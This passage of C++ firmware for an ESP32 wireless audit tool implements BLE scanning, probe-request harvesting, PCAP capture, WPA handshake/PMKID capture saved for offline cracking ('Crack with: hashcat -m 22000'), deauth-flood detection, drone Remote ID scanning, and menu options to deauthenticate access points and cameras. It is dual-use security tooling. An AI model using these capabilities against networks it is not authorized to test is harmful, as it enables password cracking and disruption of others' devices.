            static_cast<unsigned>(BLE_HEAP_FLOOR_START));
    BLEDevice::init("RadioInk");
    bleScan = BLEDevice::getScan();
    bleReady = true;
  }
  if (!bleScan) {  // controller init failed - bail gracefully instead of crashing
    LOG_ERR("RADIO", "BLE deep-dive init failed, free heap: %u", static_cast<unsigned>(ESP.getFreeHeap()));
    targetLines.push_back("BLE init failed - try again");
    status = "BLE init failed";
    showingTarget = true;
    showingDetails = false;
    showingFindings = false;
    requestUpdate();
    return;
  }
  // Passive scan + proven timing, matching the main scan path. Active scanning
  // here was triggering an out-of-memory abort() on the ESP32-C3.
  bleScan->setActiveScan(false);
  bleScan->setInterval(320);
  bleScan->setWindow(80);

  // Streaming collection (erase-as-you-go) instead of the old accumulating
  // start()+getDevice() loop, which let NimBLE's result map grow with every advert
  // and bad_alloc'd -> abort()ed in a dense beacon environment. `passesSeen` counts
  // how many of the 3 windows the target appeared in (for the "seen N/3" line);
  // `samples` counts individual adverts and drives the RSSI average.
  TargetDeepScanCb cb;
  cb.scan = bleScan;
  cb.targetAddr = address;
  bleScan->setAdvertisedDeviceCallbacks(&cb, /*wantDuplicates=*/false, /*shouldParse=*/true);
  int passesSeen = 0;
  for (int pass = 0; pass < 3; pass++) {
    const int before = cb.samples;
    bleScan->start(2, false);
    bleScan->clearResults();
    if (cb.samples > before) passesSeen++;
  }
  bleScan->setAdvertisedDeviceCallbacks(nullptr);
  shutdownBleController();

  const int rssiMin = cb.rssiMin, rssiMax = cb.rssiMax, samples = cb.samples;
  const long rssiSum = cb.rssiSum;
  std::string name = std::move(cb.name), manufacturer = std::move(cb.manufacturer), services = std::move(cb.services);
  std::string serviceDataUuid = std::move(cb.serviceDataUuid), serviceDataHex = std::move(cb.serviceDataHex);
  const bool hasTxPower = cb.hasTxPower;
  const int txPower = cb.txPower;
  const int addressType = cb.addressType;

  if (name.empty()) name = bleFindings[index].name;
  if (manufacturer.empty()) manufacturer = bleFindings[index].manufacturerHex;
  if (serviceDataUuid.empty()) serviceDataUuid = bleFindings[index].serviceDataUuid;
  if (serviceDataHex.empty()) serviceDataHex = bleFindings[index].serviceDataHex;
  const int avg = samples ? static_cast<int>(rssiSum / static_cast<long>(samples)) : bleFindings[index].rssi;
  const int lo = samples ? rssiMin : avg;
  const int hi = samples ? rssiMax : avg;
  const bool randomAddress = (addressType == 1 || addressType == 3);
  const std::string advType = decodeBleAdvert(manufacturer, serviceDataUuid, serviceDataHex);

  targetLines.push_back("Time: " + timeStamp());
  targetLines.push_back(address);
  targetLines.push_back("Name: " + (name.empty() ? std::string("<unnamed>") : name));
  if (!advType.empty()) {
    targetLines.push_back("Type: " + advType);
    appendBeaconDetail(targetLines, advType, manufacturer, serviceDataHex);
  }
  targetLines.push_back("Vendor: " + bleVendorName(manufacturer));
  if (!randomAddress) {
    const std::string macVend = macVendor(address);
    if (!macVend.empty() && macVend != "randomized") targetLines.push_back("MAC vendor: " + macVend);
  }
  targetLines.push_back("RSSI avg " + std::to_string(avg) + " (" + std::to_string(lo) + "/" + std::to_string(hi) +
                        ")  seen " + std::to_string(passesSeen) + "/3");
  if (hasTxPower) targetLines.push_back("TX power: " + std::to_string(txPower));
  if (!services.empty()) {
    const std::string svcName = bleServiceName(services);
    targetLines.push_back("Service: " + services + (svcName.empty() ? "" : (" (" + svcName + ")")));
  }
  if (!manufacturer.empty()) targetLines.push_back("Mfr data: " + manufacturer);
  targetLines.push_back(std::string("Random address: ") + (randomAddress ? "Y" : "N"));

  targetLocatable = true;
  targetLocBle = true;
  targetLocAddr = address;
  targetLocName = targetTitle;

  status = "Deep device done";
#else
  targetLines.push_back("BLE support is disabled in this build.");
  status = "BLE disabled";
#endif

  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  requestUpdate();
}

void RadioAuditActivity::startProbeScan() {
  targetTitle = "Probe Requests";
  targetLines.clear();
  probeFindings.clear();
  targetScroll = 0;
  targetFromList = false;  // launched from the main menu, returns there
  targetLocatable = false;

  status = "Harvesting probes...";
  requestUpdateAndWait();

  prepWifiSta();

  g_probeCap = makeUniqueNoThrow<ProbeCapture>();
  if (!g_probeCap) {
    LOG_ERR("RADIO", "probe: OOM");
    status = "Probe scan: out of memory";
    state = State::ERROR;
    requestUpdate();
    return;
  }

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(&probePromiscuousCb);
  wifi_promiscuous_filter_t filter = {};
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous(true);

  g_probeCap->active = true;
  for (int channel = 1; channel <= 13; channel++) {
    esp_wifi_set_channel(static_cast<uint8_t>(channel), WIFI_SECOND_CHAN_NONE);
    delay(600);
  }
  g_probeCap->active = false;
  esp_wifi_set_promiscuous(false);

  const int count = g_probeCap->count;
  probeFindings.reserve(count);
  for (int i = 0; i < count; i++) {
    const auto& row = g_probeCap->rows[i];
    ProbeEntry entry;
    entry.client = macToString(row.mac);
    entry.ssid = row.ssid;
    entry.rssi = row.rssi;
    probeFindings.push_back(std::move(entry));
  }
  g_probeCap.reset();  // free the probe table back to the heap
  std::sort(probeFindings.begin(), probeFindings.end(),
            [](const ProbeEntry& a, const ProbeEntry& b) { return a.rssi > b.rssi; });

  targetLines.push_back("Time: " + timeStamp());
  targetLines.push_back("Clients probing: " + std::to_string(probeFindings.size()));
  for (const auto& probe : probeFindings) {
    const std::string vendor = macVendor(probe.client);
    targetLines.push_back(probe.client + (vendor.empty() ? "" : ("/" + vendor)) + "  " + probeSsidLabel(probe.ssid) +
                          "  " + std::to_string(probe.rssi) + " dBm");
  }

  WiFi.scanDelete();
  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_OFF);
  delay(150);

  scanTime = timeStamp();
  auditFindings.erase(std::remove_if(auditFindings.begin(), auditFindings.end(),
                                     [](const AuditFinding& finding) {
                                       return finding.title == "Probe requests observed" ||
                                              finding.title == "Directed probe requests";
                                     }),
                      auditFindings.end());
  if (!probeFindings.empty()) {
    addAuditFinding("INFO", "Probe requests observed",
                    std::to_string(probeFindings.size()) + " client probe request(s) captured in Client Recon.");
    int directedCount = 0;
    for (const auto& probe : probeFindings)
      if (!probe.ssid.empty()) directedCount++;
    if (directedCount > 0) {
      addAuditFinding("LOW", "Directed probe requests",
                      std::to_string(directedCount) +
                          " probe request(s) named a specific SSID, which can disclose client network history.");
    }
  }
  status = std::string("Probe scan done, ") + std::to_string(probeFindings.size()) + " seen";
  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  requestUpdate();
}

void RadioAuditActivity::startPcapCapture() {
  captureMode = CaptureMode::Pcap;
  // Prepare the SD output file first: a capture with nowhere to land is useless.
  Storage.ensureDirectoryExists(CAPTURE_DIR);
  capturePath = std::string(CAPTURE_DIR) + "/cap-" + std::to_string(millis() / 1000) + ".pcap";
  if (!Storage.openFileForWrite("RADIO", capturePath, captureFile)) {
    LOG_ERR("RADIO", "PCAP: cannot open %s", capturePath.c_str());
    status = "Capture: SD open failed";
    state = State::ERROR;
    requestUpdate();
    return;
  }

  // libpcap global header (little-endian, classic format).
  uint8_t globalHeader[24];
  const uint32_t magic = 0xA1B2C3D4;
  const uint16_t versionMajor = 2;
  const uint16_t versionMinor = 4;
  const int32_t thisZone = 0;
  const uint32_t sigFigs = 0;
  const uint32_t snapLen = PCAP_SNAPLEN;
  const uint32_t network = PCAP_LINKTYPE;
  memcpy(globalHeader + 0, &magic, 4);
  memcpy(globalHeader + 4, &versionMajor, 2);
  memcpy(globalHeader + 6, &versionMinor, 2);
  memcpy(globalHeader + 8, &thisZone, 4);
  memcpy(globalHeader + 12, &sigFigs, 4);
  memcpy(globalHeader + 16, &snapLen, 4);
  memcpy(globalHeader + 20, &network, 4);
  captureFile.write(globalHeader, sizeof(globalHeader));
  captureFile.flush();

  // Bring up promiscuous mode capturing all frame types on channel 1; the loop
  // hops channels as it drains.
  status = "Capturing...";
  requestUpdateAndWait();
  prepWifiSta();

  g_pcapBuf = makeUniqueNoThrow<uint8_t[]>(PCAP_RING_SIZE);
  if (!g_pcapBuf) {
    LOG_ERR("RADIO", "PCAP: OOM ring %u bytes", static_cast<unsigned>(PCAP_RING_SIZE));
    status = "Capture: out of memory";
    state = State::ERROR;
    captureFile.close();
    requestUpdate();
    return;
  }
  memset(&g_pcap, 0, sizeof(g_pcap));
  g_pcap.buf = g_pcapBuf.get();
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(&pcapPromiscuousCb);
  wifi_promiscuous_filter_t filter = {};
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous(true);
  captureChannel = 1;
  esp_wifi_set_channel(captureChannel, WIFI_SECOND_CHAN_NONE);

  g_pcap.active = true;
  capturing = true;
  captureChannelLocked = false;
  captureBytesWritten = sizeof(globalHeader);
  captureLastHopMs = millis();
  captureLastFlushMs = millis();
  state = State::CAPTURING;
  requestUpdate();
}

void RadioAuditActivity::stopPcapCapture() {
  if (!capturing) return;
  g_pcap.active = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);

  captureBytesWritten += pcapDrain(captureFile);  // flush whatever is left in the ring
  captureFile.flush();
  captureFile.close();
  capturing = false;
  g_pcap.buf = nullptr;
  g_pcapBuf.reset();  // return the 32 KB ring to the heap

  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_OFF);
  delay(100);

  scanTime = timeStamp();
  state = State::SAVED;
  status =
      std::string("Saved ") + std::to_string(g_pcap.packets) + " pkts (" + std::to_string(g_pcap.drops) + " dropped)";

  // Show a result page (mirrors the probe-scan summary view).
  targetTitle = "PCAP capture saved";
  targetLines.clear();
  targetLines.push_back("File: " + capturePath);
  targetLines.push_back("Packets: " + std::to_string(g_pcap.packets));
  targetLines.push_back("Dropped: " + std::to_string(g_pcap.drops));
  targetLines.push_back("Bytes: " + std::to_string(captureBytesWritten));
  targetLines.push_back("Time: " + scanTime);
  targetLines.push_back("Open the .pcap in Wireshark.");
  targetScroll = 0;
  targetFromList = false;
  targetLocatable = false;
  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  requestUpdate();
}

void RadioAuditActivity::renderCapture() {
  const auto& metrics = UITheme::getInstance().getMetrics();
  const auto pageWidth = renderer.getScreenWidth();
  renderer.clearScreen();
  const int contentTop = metrics.topPadding + metrics.headerHeight + metrics.verticalSpacing;
  const int summaryX = metrics.contentSidePadding;

  GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight}, "PCAP Capture",
                 status.c_str());

  int y = contentTop;
  renderer.drawText(UI_12_FONT_ID, summaryX, y,
                    (String("Packets: ") + g_pcap.packets + "   Dropped: " + g_pcap.drops).c_str(), true,
                    EpdFontFamily::BOLD);
  y += renderer.getLineHeight(UI_12_FONT_ID) + 8;
  renderer.drawText(UI_12_FONT_ID, summaryX, y, (String("Channel: ") + captureChannel + "  (hopping 1-13)").c_str(),
                    true, EpdFontFamily::BOLD);
  y += renderer.getLineHeight(UI_12_FONT_ID) + 8;
  renderer.drawText(SMALL_FONT_ID, summaryX, y, (String("Written: ") + captureBytesWritten + " bytes").c_str());
  y += renderer.getLineHeight(SMALL_FONT_ID) + 6;
  renderer.drawText(SMALL_FONT_ID, summaryX, y,
                    renderer.truncatedText(SMALL_FONT_ID, capturePath.c_str(), pageWidth - summaryX * 2).c_str());

  const auto labels = mappedInput.mapLabels("Stop", "Stop", "", "");
  UITheme::getInstance().suppressBrandLogoOnce();  // live data view: no brand logo
  GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
  renderer.displayBuffer();
}

void RadioAuditActivity::startHandshakeCapture() {
  captureMode = CaptureMode::Handshake;
  Storage.ensureDirectoryExists(HS_DIR);
  capturePath = std::string(HS_DIR) + "/hs-" + std::to_string(millis() / 1000) + "." + "22000";
  if (!Storage.openFileForWrite("RADIO", capturePath, captureFile)) {
    LOG_ERR("RADIO", "HS: cannot open %s", capturePath.c_str());
    status = "Handshake: SD open failed";
    state = State::ERROR;
    requestUpdate();
    return;
  }

  g_hs = makeUniqueNoThrow<HandshakeCapture>();  // zero-initialized on the heap
  if (!g_hs) {
    LOG_ERR("RADIO", "HS: OOM slot table");
    status = "Handshake: out of memory";
    state = State::ERROR;
    captureFile.close();
    requestUpdate();
    return;
  }

  status = "Capturing handshakes...";
  requestUpdateAndWait();
  prepWifiSta();

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(&handshakePromiscuousCb);
  wifi_promiscuous_filter_t filter = {};
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous(true);
  captureChannel = 1;
  esp_wifi_set_channel(captureChannel, WIFI_SECOND_CHAN_NONE);

  g_hs->active = true;
  capturing = true;
  captureChannelLocked = false;
  hsPmkidCount = 0;
  hsEapolCount = 0;
  captureLastHopMs = millis();
  captureLastFlushMs = millis();
  state = State::CAPTURING;
  requestUpdate();
}

void RadioAuditActivity::processHandshakes() {
  // Write any newly-completed PMKID/EAPOL lines once we also know the ESSID.
  for (auto& s : g_hs->slots) {
    if (!s.used) continue;
    const HsSsidEntry* se = hsFindSsid(s.ap);
    if (!se || !se->ssid[0]) continue;  // hold until a beacon supplies the ESSID

    if (s.havePmkid && !s.pmkidWritten) {
      hsWritePmkidLine(captureFile, s, se->ssid);
      s.pmkidWritten = true;
      hsPmkidCount++;
    }
    if (s.haveM1 && s.haveM2 && !s.eapolWritten && memcmp(s.replayM1, s.replayM2, 8) == 0) {
      hsWriteEapolLine(captureFile, s, se->ssid);
      s.eapolWritten = true;
      hsEapolCount++;
    }
  }
}

void RadioAuditActivity::stopHandshakeCapture() {
  if (!capturing) return;
  g_hs->active = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);

  processHandshakes();  // final pass for anything completed just before stop
  captureFile.flush();
  captureFile.close();
  capturing = false;
  g_hs.reset();  // free the slot table back to the heap

  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_OFF);
  delay(100);

  scanTime = timeStamp();
  state = State::SAVED;
  status = std::string("Saved ") + std::to_string(hsPmkidCount) + " PMKID / " + std::to_string(hsEapolCount) + " EAPOL";

  targetTitle = "Handshake capture saved";
  targetLines.clear();
  targetLines.push_back("File: " + capturePath);
  targetLines.push_back("PMKID lines: " + std::to_string(hsPmkidCount));
  targetLines.push_back("EAPOL (M1+M2): " + std::to_string(hsEapolCount));
  targetLines.push_back("Time: " + scanTime);
  targetLines.push_back("Crack with: hashcat -m 22000");
  targetScroll = 0;
  targetFromList = false;
  targetLocatable = false;
  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  requestUpdate();
}

void RadioAuditActivity::renderHandshake() {
  const auto& metrics = UITheme::getInstance().getMetrics();
  const auto pageWidth = renderer.getScreenWidth();
  renderer.clearScreen();
  const int contentTop = metrics.topPadding + metrics.headerHeight + metrics.verticalSpacing;
  const int summaryX = metrics.contentSidePadding;

  GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight}, "Handshake / PMKID",
                 status.c_str());

  int y = contentTop;
  renderer.drawText(UI_12_FONT_ID, summaryX, y,
                    (String("PMKID: ") + hsPmkidCount + "   EAPOL: " + hsEapolCount).c_str(), true,
                    EpdFontFamily::BOLD);
  y += renderer.getLineHeight(UI_12_FONT_ID) + 8;
  renderer.drawText(UI_12_FONT_ID, summaryX, y, (String("Channel: ") + captureChannel + "  (hopping 1-13)").c_str(),
                    true, EpdFontFamily::BOLD);
  y += renderer.getLineHeight(UI_12_FONT_ID) + 8;
  renderer.drawText(SMALL_FONT_ID, summaryX, y, (String("Beacons seen: ") + g_hs->beaconCount).c_str());
  y += renderer.getLineHeight(SMALL_FONT_ID) + 6;
#if defined(RADIO_AUDIT_ENABLE_ACTIVE)
  HsSsidEntry* tgt = hsBestAp();
  const std::string tgtLine = tgt ? (std::string("Deauth target: ") + tgt->ssid + " CH" + std::to_string(tgt->channel))
                                  : std::string("Deauth target: (waiting for beacon)");
  renderer.drawText(SMALL_FONT_ID, summaryX, y,
                    renderer.truncatedText(SMALL_FONT_ID, tgtLine.c_str(), pageWidth - summaryX * 2).c_str());
  y += renderer.getLineHeight(SMALL_FONT_ID) + 6;
  const char* confirmLabel = "Deauth";
#else
  renderer.drawText(SMALL_FONT_ID, summaryX, y, "Passive: associate a client to force a handshake.");
  y += renderer.getLineHeight(SMALL_FONT_ID) + 6;
  const char* confirmLabel = "Stop";
#endif
  renderer.drawText(SMALL_FONT_ID, summaryX, y,
                    renderer.truncatedText(SMALL_FONT_ID, capturePath.c_str(), pageWidth - summaryX * 2).c_str());

  const auto labels = mappedInput.mapLabels("Stop", confirmLabel, "", "");
  UITheme::getInstance().suppressBrandLogoOnce();  // live data view: no brand logo
  GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
  renderer.displayBuffer();
}

void RadioAuditActivity::startDeauthDetect() {
  captureMode = CaptureMode::DeauthDetect;
  Storage.ensureDirectoryExists(HS_DIR);
  capturePath = std::string(HS_DIR) + "/deauth-" + std::to_string(millis() / 1000) + ".txt";
  if (!Storage.openFileForWrite("RADIO", capturePath, captureFile)) {
    LOG_ERR("RADIO", "DD: cannot open %s", capturePath.c_str());
    status = "Deauth detect: SD open failed";
    state = State::ERROR;
    requestUpdate();
    return;
  }

  g_dd = makeUniqueNoThrow<DeauthDetect>();  // zero-initialized on the heap
  if (!g_dd) {
    LOG_ERR("RADIO", "DD: OOM slot table");
    status = "Deauth detect: out of memory";
    state = State::ERROR;
    captureFile.close();
    requestUpdate();
    return;
  }

  const std::string hdr = "# Radio Ink deauth/disassoc flood detector\n# src,bssid,deauth,disassoc,channel,rssi\n";
  captureFile.write(reinterpret_cast<const uint8_t*>(hdr.data()), hdr.size());

  status = "Watching for deauth floods...";
  requestUpdateAndWait();
  prepWifiSta();

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(&deauthDetectCb);
  wifi_promiscuous_filter_t filter = {};
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous(true);
  captureChannel = 1;
  esp_wifi_set_channel(captureChannel, WIFI_SECOND_CHAN_NONE);

  g_dd->active = true;
  capturing = true;
  captureChannelLocked = false;
  ddAlertCount = 0;
  captureLastHopMs = millis();
  captureLastFlushMs = millis();
  state = State::CAPTURING;
  requestUpdate();
}

void RadioAuditActivity::processDeauthDetect() {
  // Write an alert line the first time a source crosses the flood threshold.
  for (auto& s : g_dd->slots) {
    if (!s.used || s.reported) continue;
    const uint16_t total = static_cast<uint16_t>(s.deauthCount + s.disassocCount);
    if (total < DD_ALERT_THRESHOLD) continue;
    const std::string line = macToString(s.src) + "," + macToString(s.bssid) + "," + std::to_string(s.deauthCount) +
                             "," + std::to_string(s.disassocCount) + "," + std::to_string(s.lastChannel) + "," +
                             std::to_string(s.lastRssi) + "\n";
    captureFile.write(reinterpret_cast<const uint8_t*>(line.data()), line.size());
    s.reported = true;
    ddAlertCount++;
  }
}

void RadioAuditActivity::stopDeauthDetect() {
  if (!capturing) return;
  g_dd->active = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);

  processDeauthDetect();  // final pass for anything that just crossed the threshold
  captureFile.flush();
  captureFile.close();

  // Snapshot the summary before freeing the slot table.
  const uint32_t totalFrames = g_dd->totalFrames;
  targetTitle = "Deauth detector stopped";
  targetLines.clear();
  targetLines.push_back("Frames seen: " + std::to_string(totalFrames));
  targetLines.push_back("Flagged sources: " + std::to_string(ddAlertCount));
  int listed = 0;
  for (const auto& s : g_dd->slots) {
    if (!s.used) continue;
    const uint16_t total = static_cast<uint16_t>(s.deauthCount + s.disassocCount);
    if (total == 0) continue;
    if (listed++ >= 8) break;
    targetLines.push_back((s.reported ? "[FLOOD] " : "") + macToString(s.src) + " x" + std::to_string(total) + " CH" +
                          std::to_string(s.lastChannel) + " " + std::to_string(s.lastRssi) + "dBm");
  }
  if (listed == 0) targetLines.push_back("No deauth/disassoc frames seen.");
  targetLines.push_back("Log: " + capturePath);

  capturing = false;
  g_dd.reset();  // free the slot table back to the heap

  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_OFF);
  delay(100);

  scanTime = timeStamp();
  state = State::SAVED;
  status = std::string("Flagged ") + std::to_string(ddAlertCount) + " source(s)";
  targetScroll = 0;
  targetFromList = false;
  targetLocatable = false;
  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  requestUpdate();
}

void RadioAuditActivity::renderDeauthDetect() {
  const auto& metrics = UITheme::getInstance().getMetrics();
  const auto pageWidth = renderer.getScreenWidth();
  renderer.clearScreen();
  const int contentTop = metrics.topPadding + metrics.headerHeight + metrics.verticalSpacing;
  const int summaryX = metrics.contentSidePadding;

  GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight}, "Deauth Detector",
                 status.c_str());

  // Live tally from the detector slots (callback updates these concurrently).
  uint32_t totalFrames = 0;
  int activeSources = 0;
  const DeauthSrc* worst = nullptr;
  if (g_dd) {
    totalFrames = g_dd->totalFrames;
    for (const auto& s : g_dd->slots) {
      if (!s.used) continue;
      const uint16_t total = static_cast<uint16_t>(s.deauthCount + s.disassocCount);
      if (total == 0) continue;
      activeSources++;
      if (!worst || total > static_cast<uint16_t>(worst->deauthCount + worst->disassocCount)) worst = &s;
    }
  }

  int y = contentTop;
  renderer.drawText(UI_12_FONT_ID, summaryX, y,
                    (String("Frames: ") + totalFrames + "   Flagged: " + ddAlertCount).c_str(), true,
                    EpdFontFamily::BOLD);
  y += renderer.getLineHeight(UI_12_FONT_ID) + 8;
  renderer.drawText(UI_12_FONT_ID, summaryX, y,
                    (String("Channel: ") + captureChannel + "  Sources: " + activeSources).c_str(), true,
                    EpdFontFamily::BOLD);
  y += renderer.getLineHeight(UI_12_FONT_ID) + 8;
  if (worst) {
    const uint16_t total = static_cast<uint16_t>(worst->deauthCount + worst->disassocCount);
    const String top = String("Top: ") + macToString(worst->src).c_str() + " x" + total;
    renderer.drawText(SMALL_FONT_ID, summaryX, y,
                      renderer.truncatedText(SMALL_FONT_ID, top.c_str(), pageWidth - summaryX * 2).c_str());
    y += renderer.getLineHeight(SMALL_FONT_ID) + 6;
  }
  renderer.drawText(SMALL_FONT_ID, summaryX, y, "Sustained bursts = deauth attack.");

  const auto labels = mappedInput.mapLabels("Stop", "Stop", "", "");
  UITheme::getInstance().suppressBrandLogoOnce();  // live data view: no brand logo
  GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
  renderer.displayBuffer();
}

void RadioAuditActivity::startDroneScan() {
  captureMode = CaptureMode::DroneScan;
  g_drone = makeUniqueNoThrow<DroneScanState>();  // zero-initialized on the heap
  if (!g_drone) {
    LOG_ERR("RADIO", "Drone: OOM slot table");
    status = "Drone scan: out of memory";
    state = State::ERROR;
    requestUpdate();
    return;
  }

  status = "Watching for drone Remote ID...";
  requestUpdateAndWait();
  prepWifiSta();

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(&droneScanCb);
  wifi_promiscuous_filter_t filter = {};
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous(true);
  captureChannel = 1;
  esp_wifi_set_channel(captureChannel, WIFI_SECOND_CHAN_NONE);

  g_drone->active = true;
  capturing = true;
  captureChannelLocked = false;
  captureLastHopMs = millis();
  captureLastFlushMs = millis();
  state = State::CAPTURING;
  requestUpdate();
}

void RadioAuditActivity::stopDroneScan() {
  if (!capturing) return;
  if (g_drone) g_drone->active = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);

  // Snapshot the detections before freeing the slot table.
  targetTitle = "Drone RID Scan";
  targetLines.clear();
  int found = 0;
  uint32_t beacons = 0, odid = 0;
  if (g_drone) {
    beacons = g_drone->beaconsSeen;
    odid = g_drone->odidFrames;
    for (const auto& d : g_drone->slots) {
      if (!d.used) continue;
      found++;
      targetLines.push_back(std::string(d.haveId && d.id[0] ? d.id : "(no ID)") + "  " + std::to_string(d.rssi) +
                            " dBm");
      char ua[40];
      snprintf(ua, sizeof(ua), "  UA type %u  CH%u  %s", d.uaType, d.channel, macToString(d.mac).c_str());
      targetLines.push_back(ua);
      if (d.haveLoc) {
        char loc[64];
        snprintf(loc, sizeof(loc), "  %.6f, %.6f  alt %dm", d.latE7 / 1e7, d.lonE7 / 1e7, d.altM);
        targetLines.push_back(loc);
      }
    }
  }
  if (found == 0) {
    targetLines.push_back("No drone Remote ID seen.");
    targetLines.push_back(std::string("Beacons scanned: ") + std::to_string(beacons));
    targetLines.push_back("Covers Wi-Fi OpenDroneID (ASTM F3411).");
    targetLines.push_back("BLE Remote ID shows in BLE/Threat scans.");
  } else {
    targetLines.insert(targetLines.begin(),
                       std::to_string(found) + " drone(s), " + std::to_string(odid) + " RID frames");
  }

  capturing = false;
  g_drone.reset();
  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_OFF);
  delay(100);

  scanTime = timeStamp();
  state = State::DONE;
  status = std::string("Drones: ") + std::to_string(found);
  targetScroll = 0;
  targetFromList = false;
  targetLocatable = false;
  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  requestUpdate();
}

void RadioAuditActivity::renderDroneScan() {
  const auto& metrics = UITheme::getInstance().getMetrics();
  const auto pageWidth = renderer.getScreenWidth();
  renderer.clearScreen();
  const int contentTop = metrics.topPadding + metrics.headerHeight + metrics.verticalSpacing;
  const int x = metrics.contentSidePadding;

  GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight}, "Drone RID Scan",
                 status.c_str());

  uint32_t beacons = 0, odid = 0;
  int drones = 0;
  if (g_drone) {
    beacons = g_drone->beaconsSeen;
    odid = g_drone->odidFrames;
    for (const auto& d : g_drone->slots)
      if (d.used) drones++;
  }

  int y = contentTop;
  renderer.drawText(UI_12_FONT_ID, x, y, (String("Drones: ") + drones + "   RID frames: " + (int)odid).c_str(), true,
                    EpdFontFamily::BOLD);
  y += renderer.getLineHeight(UI_12_FONT_ID) + 8;
  renderer.drawText(UI_12_FONT_ID, x, y, (String("Channel: ") + captureChannel + "   Beacons: " + (int)beacons).c_str(),
                    true, EpdFontFamily::BOLD);
  y += renderer.getLineHeight(UI_12_FONT_ID) + 8;

  const int lineH = renderer.getLineHeight(SMALL_FONT_ID) + 4;
  if (g_drone) {
    for (const auto& d : g_drone->slots) {
      if (!d.used) continue;
      String line = String(d.haveId && d.id[0] ? d.id : "(no ID)") + "  " + d.rssi + "dBm";
      if (d.haveLoc) {
        char loc[40];
        snprintf(loc, sizeof(loc), "  %.5f,%.5f", d.latE7 / 1e7, d.lonE7 / 1e7);
        line += loc;
      }
      renderer.drawText(SMALL_FONT_ID, x, y,
                        renderer.truncatedText(SMALL_FONT_ID, line.c_str(), pageWidth - x * 2).c_str());
      y += lineH;
    }
  }
  if (drones == 0) renderer.drawText(SMALL_FONT_ID, x, y, "Listening for OpenDroneID beacons...");

  const auto labels = mappedInput.mapLabels("Stop", "Stop", "", "");
  UITheme::getInstance().suppressBrandLogoOnce();
  GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
  renderer.displayBuffer();
}

void RadioAuditActivity::openTargetMenu() {
  targetMenuCodes.clear();
  if (targetIsCamera) {
    if (targetLocatable) targetMenuCodes.push_back(2);  // locate
#if defined(RADIO_AUDIT_ENABLE_ACTIVE)
    if (!targetLocBle) targetMenuCodes.push_back(5);  // deauth (client = directed, AP = broadcast)
#if defined(RADIO_AUDIT_ENABLE_BLE)
    if (targetIsFindMy) {
      targetMenuCodes.push_back(6);  // play sound (separated Find My / AirTag)
      targetMenuCodes.push_back(7);  // stop sound (DULT/FMNA)
    }
#endif
#endif
    targetMenuCodes.push_back(3);  // close
    targetMenuSel = 0;
    targetMenuOpen = true;
    requestUpdate();
    return;
  }
  if (targetLocBle) {
#if defined(RADIO_AUDIT_ENABLE_BLE)
    targetMenuCodes.push_back(4);  // GATT enumerate
#endif
  } else {
    const bool wifiAp = lastDeepScanWifiIndex >= 0 && lastDeepScanWifiIndex < static_cast<int>(wifiFindings.size());
    if (wifiAp) {
      targetMenuCodes.push_back(0);  // mark / unmark for deauth
#if defined(RADIO_AUDIT_ENABLE_ACTIVE)
      targetMenuCodes.push_back(1);  // deauth this AP now
#endif
    }
  }
  if (targetLocatable) targetMenuCodes.push_back(2);  // locate (find it)
  targetMenuCodes.push_back(3);                       // close
  targetMenuSel = 0;
  targetMenuOpen = true;
  requestUpdate();
}

std::string RadioAuditActivity::targetMenuLabel(int code) const {
  switch (code) {
    case 0: {
      const bool marked = lastDeepScanWifiIndex >= 0 && lastDeepScanWifiIndex < static_cast<int>(wifiFindings.size()) &&
                          wifiFindings[lastDeepScanWifiIndex].marked;
      return marked ? "Unmark target" : "Mark for deauth";
    }
    case 1:
      return "Deauth this AP";
    case 2:
      return "Locate (find it)";
    case 3:
      return "Close";
    case 4:
      return "GATT enumerate";
    case 5:
      return targetCamHasAp ? "Deauth camera" : "Deauth this AP";
    case 6:
      return "Play Sound (find it)";
    case 7:
      return "Stop Sound";
  }
  return "";
}

void RadioAuditActivity::runTargetMenuItem(int code) {
  switch (code) {
    case 0:
